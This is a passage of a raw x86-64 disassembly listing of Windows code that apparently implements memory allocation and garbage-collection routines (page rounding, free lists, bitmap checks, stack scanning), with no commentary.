    69685bb7:	48 8d 83 10 21 00 00 	lea    0x2110(%rbx),%rax
    69685bbe:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
    69685bc3:	48 85 ed             	test   %rbp,%rbp
    69685bc6:	75 0e                	jne    0x69685bd6
    69685bc8:	48 ff c7             	inc    %rdi
    69685bcb:	48 83 ff 08          	cmp    $0x8,%rdi
    69685bcf:	75 d5                	jne    0x69685ba6
    69685bd1:	48 8b 36             	mov    (%rsi),%rsi
    69685bd4:	eb a5                	jmp    0x69685b7b
    69685bd6:	40 f6 c5 01          	test   $0x1,%bpl
    69685bda:	0f 84 9b 00 00 00    	je     0x69685c7b
    69685be0:	48 8b 56 08          	mov    0x8(%rsi),%rdx
    69685be4:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
    69685be9:	48 c1 e2 09          	shl    $0x9,%rdx
    69685bed:	48 0b 54 24 28       	or     0x28(%rsp),%rdx
    69685bf2:	49 89 d1             	mov    %rdx,%r9
    69685bf5:	e8 d3 f8 ff ff       	call   0x696854cd
    69685bfa:	84 c0                	test   %al,%al
    69685bfc:	74 7d                	je     0x69685c7b
    69685bfe:	4c 89 ca             	mov    %r9,%rdx
    69685c01:	48 c1 e2 0c          	shl    $0xc,%rdx
    69685c05:	f6 02 01             	testb  $0x1,(%rdx)
    69685c08:	74 71                	je     0x69685c7b
    69685c0a:	4c 8b 7a 08          	mov    0x8(%rdx),%r15
    69685c0e:	49 81 ff c0 0f 00 00 	cmp    $0xfc0,%r15
    69685c15:	7e 09                	jle    0x69685c20
    69685c17:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
    69685c1c:	77 3f                	ja     0x69685c5d
    69685c1e:	eb 5b                	jmp    0x69685c7b
    69685c20:	48 8b 42 30          	mov    0x30(%rdx),%rax
    69685c24:	4c 8d 6a 40          	lea    0x40(%rdx),%r13
    69685c28:	4c 01 e8             	add    %r13,%rax
    69685c2b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
    69685c30:	4c 39 6c 24 30       	cmp    %r13,0x30(%rsp)
    69685c35:	76 44                	jbe    0x69685c7b
    69685c37:	49 83 7d 08 01       	cmpq   $0x1,0x8(%r13)
    69685c3c:	76 1a                	jbe    0x69685c58
    69685c3e:	4c 89 ea             	mov    %r13,%rdx
    69685c41:	4c 89 f1             	mov    %r14,%rcx
    69685c44:	e8 8b f3 ff ff       	call   0x69684fd4
    69685c49:	84 c0                	test   %al,%al
    69685c4b:	75 0b                	jne    0x69685c58
    69685c4d:	4c 89 ea             	mov    %r13,%rdx
    69685c50:	48 89 d9             	mov    %rbx,%rcx
    69685c53:	e8 cf fe ff ff       	call   0x69685b27
    69685c58:	4d 01 fd             	add    %r15,%r13
    69685c5b:	eb d3                	jmp    0x69685c30
    69685c5d:	4c 8d 5a 20          	lea    0x20(%rdx),%r11
    69685c61:	4c 89 f1             	mov    %r14,%rcx
    69685c64:	4c 89 da             	mov    %r11,%rdx
    69685c67:	e8 68 f3 ff ff       	call   0x69684fd4
    69685c6c:	84 c0                	test   %al,%al
    69685c6e:	75 0b                	jne    0x69685c7b
    69685c70:	4c 89 da             	mov    %r11,%rdx
    69685c73:	48 89 d9             	mov    %rbx,%rcx
    69685c76:	e8 ac fe ff ff       	call   0x69685b27
    69685c7b:	48 ff 44 24 28       	incq   0x28(%rsp)
    69685c80:	48 d1 ed             	shr    $1,%rbp
    69685c83:	e9 3b ff ff ff       	jmp    0x69685bc3
    69685c88:	48 83 ea 10          	sub    $0x10,%rdx
    69685c8c:	e9 5e fd ff ff       	jmp    0x696859ef
    69685c91:	48 89 ca             	mov    %rcx,%rdx
    69685c94:	48 8d 0d cd bd 0f 00 	lea    0xfbdcd(%rip),%rcx        # 0x69781a68
    69685c9b:	eb eb                	jmp    0x69685c88
    69685c9d:	eb f2                	jmp    0x69685c91
    69685c9f:	56                   	push   %rsi
    69685ca0:	53                   	push   %rbx
    69685ca1:	48 83 ec 28          	sub    $0x28,%rsp
    69685ca5:	48 89 cb             	mov    %rcx,%rbx
    69685ca8:	48 8b 49 10          	mov    0x10(%rcx),%rcx
    69685cac:	48 85 c9             	test   %rcx,%rcx
    69685caf:	75 27                	jne    0x69685cd8
    69685cb1:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
    69685cb5:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
    69685cbc:	00 
    69685cbd:	e8 cf ff ff ff       	call   0x69685c91
    69685cc2:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
    69685cc9:	00 
    69685cca:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    69685cd1:	48 83 c4 28          	add    $0x28,%rsp
    69685cd5:	5b                   	pop    %rbx
    69685cd6:	5e                   	pop    %rsi
    69685cd7:	c3                   	ret
    69685cd8:	48 8b 31             	mov    (%rcx),%rsi
    69685cdb:	e8 b1 ff ff ff       	call   0x69685c91
    69685ce0:	48 89 f1             	mov    %rsi,%rcx
    69685ce3:	eb c7                	jmp    0x69685cac
    69685ce5:	53                   	push   %rbx
    69685ce6:	48 83 ec 20          	sub    $0x20,%rsp
    69685cea:	48 89 cb             	mov    %rcx,%rbx
    69685ced:	e8 35 fb ff ff       	call   0x69685827
    69685cf2:	48 89 d9             	mov    %rbx,%rcx
    69685cf5:	48 89 c2             	mov    %rax,%rdx
    69685cf8:	48 83 c4 20          	add    $0x20,%rsp
    69685cfc:	5b                   	pop    %rbx
    69685cfd:	e9 80 f6 ff ff       	jmp    0x69685382
    69685d02:	56                   	push   %rsi
    69685d03:	53                   	push   %rbx
    69685d04:	48 83 ec 28          	sub    $0x28,%rsp
    69685d08:	48 8d 81 00 29 00 00 	lea    0x2900(%rcx),%rax
    69685d0f:	48 89 cb             	mov    %rcx,%rbx
    69685d12:	48 89 d6             	mov    %rdx,%rsi
    69685d15:	48 85 c0             	test   %rax,%rax
    69685d18:	74 2c                	je     0x69685d46
    69685d1a:	48 8b 10             	mov    (%rax),%rdx
    69685d1d:	48 83 fa 1d          	cmp    $0x1d,%rdx
    69685d21:	7e 09                	jle    0x69685d2c
    69685d23:	48 8b 80 e8 01 00 00 	mov    0x1e8(%rax),%rax
    69685d2a:	eb e9                	jmp    0x69685d15
    69685d2c:	48 89 d1             	mov    %rdx,%rcx
    69685d2f:	48 ff c2             	inc    %rdx
    69685d32:	48 c1 e1 04          	shl    $0x4,%rcx
    69685d36:	48 01 c1             	add    %rax,%rcx
    69685d39:	48 89 71 08          	mov    %rsi,0x8(%rcx)
    69685d3d:	4c 89 41 10          	mov    %r8,0x10(%rcx)
    69685d41:	48 89 10             	mov    %rdx,(%rax)
    69685d44:	eb 3b                	jmp    0x69685d81
    69685d46:	ba f0 01 00 00       	mov    $0x1f0,%edx
    69685d4b:	48 89 d9             	mov    %rbx,%rcx
    69685d4e:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
    69685d53:	e8 c5 f8 ff ff       	call   0x6968561d
    69685d58:	48 8b 93 e8 2a 00 00 	mov    0x2ae8(%rbx),%rdx
    69685d5f:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
    69685d64:	48 89 90 e8 01 00 00 	mov    %rdx,0x1e8(%rax)
    69685d6b:	48 89 83 e8 2a 00 00 	mov    %rax,0x2ae8(%rbx)
    69685d72:	48 89 70 08          	mov    %rsi,0x8(%rax)
    69685d76:	4c 89 40 10          	mov    %r8,0x10(%rax)
    69685d7a:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
    69685d81:	48 83 c4 28          	add    $0x28,%rsp
    69685d85:	5b                   	pop    %rbx
    69685d86:	5e                   	pop    %rsi
    69685d87:	c3                   	ret
    69685d88:	57                   	push   %rdi
    69685d89:	56                   	push   %rsi
    69685d8a:	53                   	push   %rbx
    69685d8b:	48 83 ec 20          	sub    $0x20,%rsp
    69685d8f:	80 b9 c9 28 00 00 00 	cmpb   $0x0,0x28c9(%rcx)
    69685d96:	48 89 cb             	mov    %rcx,%rbx
    69685d99:	48 89 d7             	mov    %rdx,%rdi
    69685d9c:	75 54                	jne    0x69685df2
    69685d9e:	48 8b 81 98 20 00 00 	mov    0x2098(%rcx),%rax
    69685da5:	48 3d ff ff 00 00    	cmp    $0xffff,%rax
    69685dab:	7e 3a                	jle    0x69685de7
    69685dad:	48 8b 91 d0 28 00 00 	mov    0x28d0(%rcx),%rdx
    69685db4:	48 c1 f8 02          	sar    $0x2,%rax
    69685db8:	b9 00 00 00 3f       	mov    $0x3f000000,%ecx
    69685dbd:	48 05 ff 0f 00 00    	add    $0xfff,%rax
    69685dc3:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
    69685dc9:	48 01 d2             	add    %rdx,%rdx
    69685dcc:	48 81 fa 00 00 00 3f 	cmp    $0x3f000000,%rdx
    69685dd3:	48 0f 4f d1          	cmovg  %rcx,%rdx
    69685dd7:	48 39 d0             	cmp    %rdx,%rax
    69685dda:	48 0f 4f c2          	cmovg  %rdx,%rax
    69685dde:	48 89 83 d0 28 00 00 	mov    %rax,0x28d0(%rbx)
    69685de5:	eb 0b                	jmp    0x69685df2
    69685de7:	48 c7 81 d0 28 00 00 	movq   $0x4000,0x28d0(%rcx)
    69685dee:	00 40 00 00 
    69685df2:	48 8b 93 d0 28 00 00 	mov    0x28d0(%rbx),%rdx
    69685df9:	48 39 fa             	cmp    %rdi,%rdx
    69685dfc:	7c 25                	jl     0x69685e23
    69685dfe:	31 c9                	xor    %ecx,%ecx
    69685e00:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69685e06:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69685e0c:	ff 15 8a 84 10 00    	call   *0x10848a(%rip)        # 0x6978e29c
    69685e12:	48 85 c0             	test   %rax,%rax
    69685e15:	48 89 c6             	mov    %rax,%rsi
    69685e18:	74 16                	je     0x69685e30
    69685e1a:	48 8b bb d0 28 00 00 	mov    0x28d0(%rbx),%rdi
    69685e21:	eb 1f                	jmp    0x69685e42
    69685e23:	48 89 f9             	mov    %rdi,%rcx
    69685e26:	e8 c8 f7 ff ff       	call   0x696855f3
    69685e2b:	48 89 c6             	mov    %rax,%rsi
    69685e2e:	eb 12                	jmp    0x69685e42
    69685e30:	48 89 f9             	mov    %rdi,%rcx
    69685e33:	e8 bb f7 ff ff       	call   0x696855f3
    69685e38:	c6 83 c9 28 00 00 01 	movb   $0x1,0x28c9(%rbx)
    69685e3f:	48 89 c6             	mov    %rax,%rsi
    69685e42:	48 01 bb 80 20 00 00 	add    %rdi,0x2080(%rbx)
    69685e49:	49 89 f8             	mov    %rdi,%r8
    69685e4c:	48 89 f2             	mov    %rsi,%rdx
    69685e4f:	48 89 d9             	mov    %rbx,%rcx
    69685e52:	48 01 bb 90 20 00 00 	add    %rdi,0x2090(%rbx)
    69685e59:	e8 a4 fe ff ff       	call   0x69685d02
    69685e5e:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
    69685e62:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
    69685e69:	00 
    69685e6a:	4c 8d 9b a8 20 00 00 	lea    0x20a8(%rbx),%r11
    69685e71:	4c 89 ca             	mov    %r9,%rdx
    69685e74:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
    69685e7b:	00 
    69685e7c:	48 c1 fa 0c          	sar    $0xc,%rdx
    69685e80:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
    69685e84:	4c 89 d9             	mov    %r11,%rcx
    69685e87:	e8 41 f6 ff ff       	call   0x696854cd
    69685e8c:	84 c0                	test   %al,%al
    69685e8e:	74 0c                	je     0x69685e9c
    69685e90:	49 8b 01             	mov    (%r9),%rax
    69685e93:	83 e0 01             	and    $0x1,%eax
    69685e96:	48 09 f8             	or     %rdi,%rax
    69685e99:	49 89 01             	mov    %rax,(%r9)
    69685e9c:	4c 8b 8b a0 20 00 00 	mov    0x20a0(%rbx),%r9
    69685ea3:	4d 85 c9             	test   %r9,%r9
    69685ea6:	75 06                	jne    0x69685eae
    69685ea8:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
    69685eae:	49 89 f2             	mov    %rsi,%r10
    69685eb1:	4c 89 d9             	mov    %r11,%rcx
    69685eb4:	4d 29 ca             	sub    %r9,%r10
    69685eb7:	4c 89 d2             	mov    %r10,%rdx
    69685eba:	48 c1 fa 0c          	sar    $0xc,%rdx
    69685ebe:	e8 0a f6 ff ff       	call   0x696854cd
    69685ec3:	48 8b 16             	mov    (%rsi),%rdx
    69685ec6:	83 e2 01             	and    $0x1,%edx
    69685ec9:	84 c0                	test   %al,%al
    69685ecb:	74 09                	je     0x69685ed6
    69685ecd:	4d 39 4a 08          	cmp    %r9,0x8(%r10)
    69685ed1:	75 03                	jne    0x69685ed6
    69685ed3:	4c 09 ca             	or     %r9,%rdx
    69685ed6:	48 89 f0             	mov    %rsi,%rax
    69685ed9:	48 89 16             	mov    %rdx,(%rsi)
    69685edc:	48 89 bb a0 20 00 00 	mov    %rdi,0x20a0(%rbx)
    69685ee3:	48 83 c4 20          	add    $0x20,%rsp
    69685ee7:	5b                   	pop    %rbx
    69685ee8:	5e                   	pop    %rsi
    69685ee9:	5f                   	pop    %rdi
    69685eea:	c3                   	ret
    69685eeb:	57                   	push   %rdi
    69685eec:	56                   	push   %rsi
    69685eed:	53                   	push   %rbx
    69685eee:	48 83 ec 20          	sub    $0x20,%rsp
    69685ef2:	bf 00 00 00 3f       	mov    $0x3f000000,%edi
    69685ef7:	48 89 cb             	mov    %rcx,%rbx
    69685efa:	89 d1                	mov    %edx,%ecx
    69685efc:	49 89 d0             	mov    %rdx,%r8
    69685eff:	e8 36 ba ff ff       	call   0x6968193a
    69685f04:	8d 48 fb             	lea    -0x5(%rax),%ecx
    69685f07:	b8 01 00 00 00       	mov    $0x1,%eax
    69685f0c:	48 d3 e0             	shl    %cl,%rax
    69685f0f:	48 05 ff 0f 00 00    	add    $0xfff,%rax
    69685f15:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
    69685f1b:	4e 8d 54 00 ff       	lea    -0x1(%rax,%r8,1),%r10
    69685f20:	48 f7 d8             	neg    %rax
    69685f23:	49 21 c2             	and    %rax,%r10
    69685f26:	49 81 fa 00 00 00 3f 	cmp    $0x3f000000,%r10
    69685f2d:	49 0f 4e fa          	cmovle %r10,%rdi
    69685f31:	89 f9                	mov    %edi,%ecx
    69685f33:	48 89 fe             	mov    %rdi,%rsi
    69685f36:	e8 ff b9 ff ff       	call   0x6968193a
    69685f3b:	ba ff ff ff ff       	mov    $0xffffffff,%edx
    69685f40:	8d 48 fb             	lea    -0x5(%rax),%ecx
    69685f43:	4c 8d 40 fa          	lea    -0x6(%rax),%r8
    69685f47:	48 d3 fe             	sar    %cl,%rsi
    69685f4a:	48 89 f1             	mov    %rsi,%rcx
    69685f4d:	48 89 d6             	mov    %rdx,%rsi
    69685f50:	48 83 e9 20          	sub    $0x20,%rcx
    69685f54:	48 d3 e6             	shl    %cl,%rsi
    69685f57:	48 89 f1             	mov    %rsi,%rcx
    69685f5a:	23 8c 83 fc 07 00 00 	and    0x7fc(%rbx,%rax,4),%ecx
    69685f61:	75 2d                	jne    0x69685f90
    69685f63:	41 8d 48 01          	lea    0x1(%r8),%ecx
    69685f67:	48 d3 e2             	shl    %cl,%rdx
    69685f6a:	23 93 10 08 00 00    	and    0x810(%rbx),%edx
    69685f70:	89 d1                	mov    %edx,%ecx
    69685f72:	f7 d9                	neg    %ecx
    69685f74:	21 d1                	and    %edx,%ecx
    69685f76:	e8 bf b9 ff ff       	call   0x6968193a
    69685f7b:	48 85 c0             	test   %rax,%rax
    69685f7e:	49 89 c0             	mov    %rax,%r8
    69685f81:	7e 4e                	jle    0x69685fd1
    69685f83:	8b 84 83 14 08 00 00 	mov    0x814(%rbx,%rax,4),%eax
    69685f8a:	89 c1                	mov    %eax,%ecx
    69685f8c:	f7 d9                	neg    %ecx
    69685f8e:	eb 04                	jmp    0x69685f94
    69685f90:	89 c8                	mov    %ecx,%eax
    69685f92:	f7 d8                	neg    %eax
    69685f94:	21 c1                	and    %eax,%ecx
    69685f96:	e8 9f b9 ff ff       	call   0x6968193a
    69685f9b:	4c 89 c2             	mov    %r8,%rdx
    69685f9e:	48 c1 e2 05          	shl    $0x5,%rdx
    69685fa2:	48 8d 94 10 0e 01 00 	lea    0x10e(%rax,%rdx,1),%rdx
    69685fa9:	00 
    69685faa:	48 8b 74 d3 08       	mov    0x8(%rbx,%rdx,8),%rsi
    69685faf:	48 85 f6             	test   %rsi,%rsi
    69685fb2:	74 1d                	je     0x69685fd1
    69685fb4:	49 89 c1             	mov    %rax,%r9
    69685fb7:	48 89 f2             	mov    %rsi,%rdx
    69685fba:	48 89 d9             	mov    %rbx,%rcx
    69685fbd:	e8 4b f3 ff ff       	call   0x6968530d
    69685fc2:	48 8d 87 ff 0f 00 00 	lea    0xfff(%rdi),%rax
    69685fc9:	48 3b 46 08          	cmp    0x8(%rsi),%rax
    69685fcd:	7d 3f                	jge    0x6968600e
    69685fcf:	eb 2f                	jmp    0x69686000
    69685fd1:	49 81 fa ff ff 07 00 	cmp    $0x7ffff,%r10
    69685fd8:	7e 16                	jle    0x69685ff0
    69685fda:	48 89 fa             	mov    %rdi,%rdx
    69685fdd:	48 89 d9             	mov    %rbx,%rcx
    69685fe0:	e8 a3 fd ff ff       	call   0x69685d88
    69685fe5:	48 39 78 08          	cmp    %rdi,0x8(%rax)
    69685fe9:	48 89 c6             	mov    %rax,%rsi
    69685fec:	7e 20                	jle    0x6968600e
    69685fee:	eb 10                	jmp    0x69686000
    69685ff0:	ba 00 00 08 00       	mov    $0x80000,%edx
    69685ff5:	48 89 d9             	mov    %rbx,%rcx
    69685ff8:	e8 8b fd ff ff       	call   0x69685d88
    69685ffd:	48 89 c6             	mov    %rax,%rsi
    69686000:	49 89 f8             	mov    %rdi,%r8
    69686003:	48 89 f2             	mov    %rsi,%rdx
    69686006:	48 89 d9             	mov    %rbx,%rcx
    69686009:	e8 d7 fc ff ff       	call   0x69685ce5
    6968600e:	49 89 f0             	mov    %rsi,%r8
    69686011:	48 c7 06 01 00 00 00 	movq   $0x1,(%rsi)
    69686018:	48 89 d9             	mov    %rbx,%rcx
    6968601b:	48 8d 93 a8 20 00 00 	lea    0x20a8(%rbx),%rdx
    69686022:	49 c1 f8 0c          	sar    $0xc,%r8
    69686026:	e8 6b f7 ff ff       	call   0x69685796
    6968602b:	48 89 f0             	mov    %rsi,%rax
    6968602e:	48 29 bb 90 20 00 00 	sub    %rdi,0x2090(%rbx)
    69686035:	48 83 c4 20          	add    $0x20,%rsp
    69686039:	5b                   	pop    %rbx
    6968603a:	5e                   	pop    %rsi
    6968603b:	5f                   	pop    %rdi
    6968603c:	c3                   	ret
    6968603d:	ba 00 10 00 00       	mov    $0x1000,%edx
    69686042:	e9 a4 fe ff ff       	jmp    0x69685eeb
    69686047:	55                   	push   %rbp
    69686048:	57                   	push   %rdi
    69686049:	56                   	push   %rsi
    6968604a:	53                   	push   %rbx
    6968604b:	48 83 ec 28          	sub    $0x28,%rsp
    6968604f:	48 8d 42 0f          	lea    0xf(%rdx),%rax
    69686053:	48 89 cb             	mov    %rcx,%rbx
    69686056:	48 89 c7             	mov    %rax,%rdi
    69686059:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
    6968605d:	48 81 ff c0 0f 00 00 	cmp    $0xfc0,%rdi
    69686064:	7e 1e                	jle    0x69686084
    69686066:	48 8d 7a 20          	lea    0x20(%rdx),%rdi
    6968606a:	48 81 ff 00 00 00 3f 	cmp    $0x3f000000,%rdi
    69686071:	0f 8f e1 00 00 00    	jg     0x69686158
    69686077:	48 89 fa             	mov    %rdi,%rdx
    6968607a:	e8 6c fe ff ff       	call   0x69685eeb
    6968607f:	e9 dc 00 00 00       	jmp    0x69686160
    69686084:	48 c1 f8 04          	sar    $0x4,%rax
    69686088:	48 8d 2c c1          	lea    (%rcx,%rax,8),%rbp
    6968608c:	48 8b 45 10          	mov    0x10(%rbp),%rax
    69686090:	48 85 c0             	test   %rax,%rax
    69686093:	74 12                	je     0x696860a7
    69686095:	48 8b 70 20          	mov    0x20(%rax),%rsi
    69686099:	48 85 f6             	test   %rsi,%rsi
    6968609c:	74 55                	je     0x696860f3
    6968609e:	48 8b 16             	mov    (%rsi),%rdx
    696860a1:	48 89 50 20          	mov    %rdx,0x20(%rax)
    696860a5:	eb 5c                	jmp    0x69686103
    696860a7:	e8 91 ff ff ff       	call   0x6968603d
    696860ac:	ba c0 0f 00 00       	mov    $0xfc0,%edx
    696860b1:	48 29 fa             	sub    %rdi,%rdx
    696860b4:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    696860bb:	00 
    696860bc:	48 89 50 28          	mov    %rdx,0x28(%rax)
    696860c0:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    696860c7:	00 
    696860c8:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    696860cc:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
    696860d3:	00 
    696860d4:	48 89 78 08          	mov    %rdi,0x8(%rax)
    696860d8:	48 89 78 30          	mov    %rdi,0x30(%rax)
    696860dc:	48 85 d2             	test   %rdx,%rdx
    696860df:	48 89 50 10          	mov    %rdx,0x10(%rax)
    696860e3:	74 04                	je     0x696860e9
    696860e5:	48 89 42 18          	mov    %rax,0x18(%rdx)
    696860e9:	48 89 45 10          	mov    %rax,0x10(%rbp)
    696860ed:	48 8d 70 40          	lea    0x40(%rax),%rsi
    696860f1:	eb 14                	jmp    0x69686107
    696860f3:	48 8b 50 30          	mov    0x30(%rax),%rdx
    696860f7:	48 8d 74 10 40       	lea    0x40(%rax,%rdx,1),%rsi
    696860fc:	48 01 fa             	add    %rdi,%rdx
    696860ff:	48 89 50 30          	mov    %rdx,0x30(%rax)
    69686103:	48 29 78 28          	sub    %rdi,0x28(%rax)
    69686107:	48 39 78 28          	cmp    %rdi,0x28(%rax)
    6968610b:	7d 42                	jge    0x6968614f
    6968610d:	48 3b 45 10          	cmp    0x10(%rbp),%rax
    69686111:	48 8b 50 10          	mov    0x10(%rax),%rdx
    69686115:	74 17                	je     0x6968612e
    69686117:	48 8b 48 18          	mov    0x18(%rax),%rcx
    6968611b:	48 89 51 10          	mov    %rdx,0x10(%rcx)
    6968611f:	48 8b 50 10          	mov    0x10(%rax),%rdx
    69686123:	48 85 d2             	test   %rdx,%rdx
    69686126:	74 17                	je     0x6968613f
    69686128:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
    6968612c:	eb 11                	jmp    0x6968613f
    6968612e:	48 85 d2             	test   %rdx,%rdx
    69686131:	48 89 55 10          	mov    %rdx,0x10(%rbp)
    69686135:	74 08                	je     0x6968613f
    69686137:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
    6968613e:	00 
    6968613f:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    69686146:	00 
    69686147:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
    6968614e:	00 
    6968614f:	48 01 bb 98 20 00 00 	add    %rdi,0x2098(%rbx)
    69686156:	eb 49                	jmp    0x696861a1
    69686158:	48 89 fa             	mov    %rdi,%rdx
    6968615b:	e8 6a f6 ff ff       	call   0x696857ca
    69686160:	48 83 bb a8 28 00 00 	cmpq   $0x0,0x28a8(%rbx)
    69686167:	00 
    69686168:	48 8d 70 20          	lea    0x20(%rax),%rsi
    6968616c:	48 89 c5             	mov    %rax,%rbp
    6968616f:	75 0f                	jne    0x69686180
    69686171:	48 89 d9             	mov    %rbx,%rcx
    69686174:	e8 60 f0 ff ff       	call   0x696851d9
    69686179:	48 89 83 a8 28 00 00 	mov    %rax,0x28a8(%rbx)
    69686180:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
    69686187:	49 89 f0             	mov    %rsi,%r8
    6968618a:	48 89 d9             	mov    %rbx,%rcx
    6968618d:	4c 8d 0c 3e          	lea    (%rsi,%rdi,1),%r9
    69686191:	e8 69 f5 ff ff       	call   0x696856ff
    69686196:	48 8b 45 08          	mov    0x8(%rbp),%rax
    6968619a:	48 01 83 98 20 00 00 	add    %rax,0x2098(%rbx)
    696861a1:	48 89 f0             	mov    %rsi,%rax
    696861a4:	48 83 c4 28          	add    $0x28,%rsp
    696861a8:	5b                   	pop    %rbx
    696861a9:	5e                   	pop    %rsi
    696861aa:	5f                   	pop    %rdi
    696861ab:	5d                   	pop    %rbp
    696861ac:	c3                   	ret
    696861ad:	48 83 ec 28          	sub    $0x28,%rsp
    696861b1:	48 83 c2 10          	add    $0x10,%rdx
    696861b5:	e8 8d fe ff ff       	call   0x69686047
    696861ba:	48 c7 40 08 01 00 00 	movq   $0x1,0x8(%rax)
    696861c1:	00 
    696861c2:	48 83 c0 10          	add    $0x10,%rax
    696861c6:	48 83 c4 28          	add    $0x28,%rsp
    696861ca:	c3                   	ret
    696861cb:	48 89 ca             	mov    %rcx,%rdx
    696861ce:	48 8d 0d 93 b8 0f 00 	lea    0xfb893(%rip),%rcx        # 0x69781a68
    696861d5:	eb d6                	jmp    0x696861ad
    696861d7:	41 54                	push   %r12
    696861d9:	55                   	push   %rbp
    696861da:	57                   	push   %rdi
    696861db:	56                   	push   %rsi
    696861dc:	53                   	push   %rbx
    696861dd:	48 83 ec 20          	sub    $0x20,%rsp
    696861e1:	48 8b 41 08          	mov    0x8(%rcx),%rax
    696861e5:	48 3b 01             	cmp    (%rcx),%rax
    696861e8:	48 89 cb             	mov    %rcx,%rbx
    696861eb:	49 89 d4             	mov    %rdx,%r12
    696861ee:	7f 44                	jg     0x69686234
    696861f0:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
    696861f4:	41 b8 02 00 00 00    	mov    $0x2,%r8d
    696861fa:	48 99                	cqto
    696861fc:	49 f7 f8             	idiv   %r8
    696861ff:	48 89 41 08          	mov    %rax,0x8(%rcx)
    69686203:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    6968620a:	00 
    6968620b:	e8 bb ff ff ff       	call   0x696861cb
    69686210:	48 8b 73 10          	mov    0x10(%rbx),%rsi
    69686214:	48 89 c5             	mov    %rax,%rbp
    69686217:	48 8b 03             	mov    (%rbx),%rax
    6968621a:	48 89 ef             	mov    %rbp,%rdi
    6968621d:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    69686224:	00 
    69686225:	f3 a4                	rep movsb (%rsi),(%rdi)
    69686227:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
    6968622b:	e8 61 fa ff ff       	call   0x69685c91
    69686230:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
    69686234:	48 8b 03             	mov    (%rbx),%rax
    69686237:	48 8b 53 10          	mov    0x10(%rbx),%rdx
    6968623b:	4c 89 24 c2          	mov    %r12,(%rdx,%rax,8)
    6968623f:	48 ff c0             	inc    %rax
    69686242:	48 89 03             	mov    %rax,(%rbx)
    69686245:	48 83 c4 20          	add    $0x20,%rsp
    69686249:	5b                   	pop    %rbx
    6968624a:	5e                   	pop    %rsi
    6968624b:	5f                   	pop    %rdi
    6968624c:	5d                   	pop    %rbp
    6968624d:	41 5c                	pop    %r12
    6968624f:	c3                   	ret
    69686250:	48 83 ec 28          	sub    $0x28,%rsp
    69686254:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
    6968625b:	49 89 cb             	mov    %rcx,%r11
    6968625e:	76 22                	jbe    0x69686282
    69686260:	48 8d 49 68          	lea    0x68(%rcx),%rcx
    69686264:	e8 9d f2 ff ff       	call   0x69685506
    69686269:	48 85 c0             	test   %rax,%rax
    6968626c:	74 14                	je     0x69686282
    6968626e:	48 83 00 08          	addq   $0x8,(%rax)
    69686272:	49 8d 4b 30          	lea    0x30(%r11),%rcx
    69686276:	48 89 c2             	mov    %rax,%rdx
    69686279:	48 83 c4 28          	add    $0x28,%rsp
    6968627d:	e9 55 ff ff ff       	jmp    0x696861d7
    69686282:	48 83 c4 28          	add    $0x28,%rsp
    69686286:	c3                   	ret
    69686287:	55                   	push   %rbp
    69686288:	41 54                	push   %r12
    6968628a:	57                   	push   %rdi
    6968628b:	56                   	push   %rsi
    6968628c:	53                   	push   %rbx
    6968628d:	48 89 e5             	mov    %rsp,%rbp
    69686290:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    69686297:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
    6968629b:	48 8d 8d 00 ff ff ff 	lea    -0x100(%rbp),%rcx
    696862a2:	48 89 ea             	mov    %rbp,%rdx
    696862a5:	e8 c6 60 00 00       	call   0x6968c370
    696862aa:	85 c0                	test   %eax,%eax
    696862ac:	0f 85 c7 00 00 00    	jne    0x69686379
    696862b2:	48 8b 45 30          	mov    0x30(%rbp),%rax
    696862b6:	48 8d 9d 00 ff ff ff 	lea    -0x100(%rbp),%rbx
    696862bd:	49 89 ec             	mov    %rbp,%r12
    696862c0:	48 8b 38             	mov    (%rax),%rdi
    696862c3:	48 89 fe             	mov    %rdi,%rsi
    696862c6:	49 39 dc             	cmp    %rbx,%r12
    696862c9:	77 06                	ja     0x696862d1
    696862cb:	48 83 ee 40          	sub    $0x40,%rsi
    696862cf:	eb 1f                	jmp    0x696862f0
    696862d1:	48 8b 13             	mov    (%rbx),%rdx
    696862d4:	48 83 c3 08          	add    $0x8,%rbx
    696862d8:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    696862dc:	e8 6f ff ff ff       	call   0x69686250
    696862e1:	48 8b 53 fc          	mov    -0x4(%rbx),%rdx
    696862e5:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
    696862e9:	e8 62 ff ff ff       	call   0x69686250
